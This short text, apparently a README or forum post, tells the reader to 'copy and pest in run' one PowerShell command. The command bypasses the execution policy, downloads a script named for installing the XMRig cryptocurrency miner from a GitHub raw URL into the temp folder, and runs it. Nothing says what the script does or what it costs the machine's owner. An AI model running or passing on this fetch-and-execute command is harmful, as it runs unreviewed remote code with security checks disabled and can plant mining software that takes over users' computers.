copy and pest in run :




``powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mub-drk/mining-xmrig/refs/heads/main/install-run-xmrig-windows.ps1' -OutFile $env:TEMP\install_xmrig.ps1; Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File $env:TEMP\install_xmrig.ps1' -NoNewWindow -Wait" ``
